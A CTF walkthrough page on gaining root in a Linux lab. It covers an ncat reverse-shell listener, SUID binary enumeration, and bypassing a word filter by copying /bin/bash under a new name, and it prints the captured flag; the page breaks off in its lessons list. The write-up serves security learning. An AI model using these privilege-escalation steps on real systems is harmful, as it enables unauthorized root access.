<!DOCTYPE html> <html lang="en"><head>
<title>ðŸ“¦ Phasing Through Printers</title>
<base href="../../..">
<meta name="pathname" content="walkthroughs/huntress-'25/day-15/ðŸ“¦-phasing-through-printers.html">
<meta name="description" content="CTF-Writeups - ðŸ“¦ Phasing Through Printers">
<meta property="og:title" content="ðŸ“¦ Phasing Through Printers">
<meta property="og:description" content="CTF-Writeups - ðŸ“¦ Phasing Through Printers">
<meta property="og:type" content="website">
<meta property="og:url" content="walkthroughs/huntress-'25/day-15/ðŸ“¦-phasing-through-printers.html">
<meta property="og:image" content="undefined">
<meta charset="UTF-8"><meta property="og:site_name" content="CTF-Writeups"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="preload" href="site-lib/styles/other-plugins.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/other-plugins.css"></noscript><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/supported-plugins.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/supported-plugins.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><body class="publish css-settings-manager show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><div id="search-container"><div id="search-wrapper"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div aria-label="Clear search" id="search-clear-button"></div></div></div></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"><link itemprop="include" href="site-lib/html/file-tree-content.html"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event allow-fold-headings allow-fold-lists show-indentation-guide show-properties is-readable-line-width" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="ðŸ“¦_Phasing_Through_Printers_0">ðŸ“¦ Phasing Through Printers</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-blockquote"><blockquote dir="auto">
<p>Platform Name: CTF Challenge<br>
Category: <a href="?query=tag:PrivilegeEscalation" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#PrivilegeEscalation">#PrivilegeEscalation</a>, <a href="?query=tag:Linux" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#Linux">#Linux</a><br>
Date: 2025-10-15<br>
Author: Joe Lipinski</p>
</blockquote></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Table of Contents" dir="auto" class="heading" id="Table_of_Contents_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Table of Contents</h2></div><div class="el-ol"><ol>
<li data-line="0" dir="auto"><a class="internal-link" data-href="#introduction" href="#introduction" target="_self" rel="noopener nofollow">Introduction</a></li>
<li data-line="1" dir="auto"><a class="internal-link" data-href="#setup" href="#setup" target="_self" rel="noopener nofollow">Setup</a></li>
<li data-line="2" dir="auto"><a class="internal-link" data-href="#reconnaissance" href="#reconnaissance" target="_self" rel="noopener nofollow">Reconnaissance</a></li>
<li data-line="3" dir="auto"><a class="internal-link" data-href="#enumeration" href="#enumeration" target="_self" rel="noopener nofollow">Enumeration</a></li>
<li data-line="4" dir="auto"><a class="internal-link" data-href="#exploitation" href="#exploitation" target="_self" rel="noopener nofollow">Exploitation</a></li>
<li data-line="5" dir="auto"><a class="internal-link" data-href="#post-exploitationflag" href="#post-exploitationflag" target="_self" rel="noopener nofollow">Post-Exploitation/Flag</a></li>
<li data-line="6" dir="auto"><a class="internal-link" data-href="#lessons-learned" href="#lessons-learned" target="_self" rel="noopener nofollow">Lessons Learned</a></li>
<li data-line="7" dir="auto"><a class="internal-link" data-href="#references" href="#references" target="_self" rel="noopener nofollow">References</a></li>
</ol></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Introduction" dir="auto" class="heading" id="Introduction_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Introduction</h2></div><div class="el-p"><p dir="auto">Objective:<br>
The primary objective of this challenge was to gain root access on a Linux target and capture the final flag located in the /root directory. The path to root involved escalating privileges from a low-privilege web user (www-data).</p></div><div class="el-p"><p dir="auto">Description:<br>
This challenge centered around a custom SUID binary. Initial access as www-data was assumed, and the focus was entirely on local enumeration and privilege escalation. The core of the challenge was to analyze the binary, discover its flawed security mechanism, and bypass it to execute commands as the root user.</p></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Setup" dir="auto" class="heading" id="Setup_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Setup</h2></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span><strong>Operating System:</strong>&nbsp;macOS</li>
<li data-line="1" dir="auto"><span class="list-bullet"></span><strong>Tools Used:</strong>&nbsp;<a href="?query=tag:ncat" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#ncat">#ncat</a>, <a href="?query=tag:python" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#python">#python</a>, <a href="?query=tag:find" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#find">#find</a></li>
<li data-line="2" dir="auto"><span class="list-bullet"></span><strong>Network Configuration:</strong>&nbsp;A reverse shell was established from the target to the attacker's machine, which was listening on a designated port.</li>
</ul></div><div class="el-p"><p dir="auto">Bash</p></div><div class="el-pre"><pre><code data-line="0"># Example: Starting the reverse shell listener
ncat -nlvp 9001
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Reconnaissance" dir="auto" class="heading" id="Reconnaissance_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Reconnaissance</h2></div><div class="el-p"><p dir="auto">Initial reconnaissance and port scanning steps (e.g., Nmap) were not part of this walkthrough, as the starting point was having already obtained a low-privilege shell on the target system.</p></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Enumeration" dir="auto" class="heading" id="Enumeration_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Enumeration</h2></div><div class="el-p"><p dir="auto">Enumeration began after establishing a stable reverse shell as the&nbsp;<code>www-data</code>&nbsp;user. The goal was to find a vector for privilege escalation.</p></div><div class="el-p"><p dir="auto">The following manual checks were performed:</p></div><div class="el-ol"><ol>
<li data-line="0" dir="auto"><strong>Check&nbsp;<code>sudo</code>&nbsp;permissions</strong>: This was the first check, but the&nbsp;<code>sudo</code>&nbsp;command was not found on the system.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token comment"># Output: bash: sudo: command not found</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-ol"><ol start="2">
<li data-line="0" dir="auto"><strong>Check for SUID binaries</strong>: This was the key enumeration step. A search was performed for all files with the SUID bit set.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><strong>Interesting Discoveries:</strong></p></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span><strong>Discovery</strong>: The&nbsp;<code>find</code>&nbsp;command revealed an unusual, non-standard SUID binary:&nbsp;<code>/usr/local/bin/admin_help</code>. This immediately became the primary target for investigation.</li>
</ul></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Exploitation" dir="auto" class="heading" id="Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Exploitation</h2></div><div class="el-p"><p dir="auto">Initial exploitation to gain the&nbsp;<code>www-data</code>&nbsp;shell was assumed to be complete. The primary exploitation detailed here is the exploitation of the privilege escalation vulnerability.</p></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Privilege Escalation" dir="auto" class="heading" id="Privilege_Escalation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Privilege Escalation</h2></div><div class="el-h3"><h3 data-heading="Vulnerability Identification" dir="auto" class="heading" id="Vulnerability_Identification_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Vulnerability Identification</h3></div><div class="el-p"><p dir="auto">The vulnerability was a custom SUID binary&nbsp;<code>/usr/local/bin/admin_help</code>&nbsp;owned by root. Analysis with the&nbsp;<code>strings</code>command revealed that this binary was designed to execute a script located at&nbsp;<code>/tmp/wish.sh</code>. However, it contained a flawed security filter that checked the contents of the script for "bad strings" before execution.</p></div><div class="el-h3"><h3 data-heading="Steps to Escalate Privileges:" dir="auto" class="heading" id="Steps_to_Escalate_Privileges_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Steps to Escalate Privileges:</h3></div><div class="el-ol"><ol>
<li data-line="0" dir="auto"><strong>Analyze the binary</strong>: After identifying the SUID binary, the&nbsp;<code>strings</code>&nbsp;command was used to understand its functionality.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">strings /usr/local/bin/admin_help
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">This revealed the program's intent to execute&nbsp;<code>/tmp/wish.sh</code>.</p></div><div class="el-ol"><ol start="2">
<li data-line="0" dir="auto"><strong>Initial Exploit Attempt</strong>: A simple payload was created in&nbsp;<code>/tmp/wish.sh</code>.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">&gt;</span> /tmp/wish.sh
/usr/local/bin/admin_help
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">This failed with a "Bad String in File" error, indicating a filter was in place.</p></div><div class="el-ol"><ol start="3">
<li data-line="0" dir="auto"><strong>Test Filter Hypothesis</strong>: A new hypothesis was formed: the program filters for "bad words" like&nbsp;<code>bash</code>&nbsp;or&nbsp;<code>sh</code>. A test was conducted using a "safe" command.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">echo</span> <span class="token string">'id &gt; /tmp/pwned'</span> <span class="token operator">&gt;</span> /tmp/wish.sh
/usr/local/bin/admin_help
<span class="token function">cat</span> /tmp/pwned
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The output file&nbsp;<code>/tmp/pwned</code>&nbsp;contained&nbsp;<code>uid=0(root)</code>, confirming the filter hypothesis and proving we could execute commands as root.</p></div><div class="el-ol"><ol start="4">
<li data-line="0" dir="auto"><strong>Bypass the Filter</strong>: The filter was bypassed by copying the&nbsp;<code>/bin/bash</code>&nbsp;executable to a new, "safe" name.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">cp</span> /bin/bash /tmp/mything
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-ol"><ol start="5">
<li data-line="0" dir="auto"><strong>Final Payload</strong>: The&nbsp;<code>wish.sh</code>&nbsp;script was created one last time, pointing to our renamed shell.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">echo</span> <span class="token string">'/tmp/mything'</span> <span class="token operator">&gt;</span> /tmp/wish.sh
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-ol"><ol start="6">
<li data-line="0" dir="auto"><strong>Trigger Exploit</strong>: The SUID binary was run, which now executed our payload without being caught by the filter, granting a root shell.</li>
</ol></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">./admin_help
<span class="token comment"># whoami</span>
root
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Post-Exploitation/Flag" dir="auto" class="heading" id="Post-Exploitation/Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Post-Exploitation/Flag</h2></div><div class="el-h3"><h3 data-heading="Capturing the Flag" dir="auto" class="heading" id="Capturing_the_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Capturing the Flag</h3></div><div class="el-p"><p dir="auto">Once root access was obtained, the flag was found in the&nbsp;<code>/root</code>&nbsp;directory.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># Reading the flag</span>
<span class="token builtin class-name">cd</span> /root
<span class="token function">cat</span> flag.txt
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="" data-callout="success" class="callout"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-check"><path d="M20 6 9 17l-5-5"></path></svg></div><div class="callout-title-inner">Flag</div></div><div class="callout-content">
<p dir="auto">flag{93541544b91b7d2b9d61e90becbca309}</p>
</div></div></div><div class="el-hr"><hr></div><div class="el-h2"><h2 data-heading="Lessons Learned" dir="auto" class="heading" id="Lessons_Learned_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Lessons Learned</h2></div><div class="el-ul"><ul class="has-list-bullet">
<li data-line="0" dir="auto"><span class="list-bullet"></span><strong>Methodical Enumeration is Key</strong>: The path to root was discovered by systematically checking common privilege escalation vectors, starting with&nbsp;<code>sudo</code>&nbsp;and moving to SUID files.</li>
<li data-line="1" dir="auto"><span class="list-bullet"></span><strong>Analyze Custom Binaries</strong>: Non-standard binaries, especially with SUID permissions, are prime targets. Using tools like&nbsp;<code>strings</code>&nbsp;is essential for static analysis.</li>
<li data-line="2" dir="auto"><span class="list-bullet"></span><strong>Bypassing Filters</strong>: When faced with a security mechanism, form a hypothesis (e.g., a word filter) and test it with a safe payload. Simple bypasses, like renaming an executable, can be very effective.</li>
<li data-line="3" dir="auto"><span class="list-bullet"></span><strong>CTF Binaries Have Bugs</strong>: Analysis of the source code revealed a bug where the filter only ever checked for "sh", not the other words in its list. This is a realistic detail in challenges.</li>
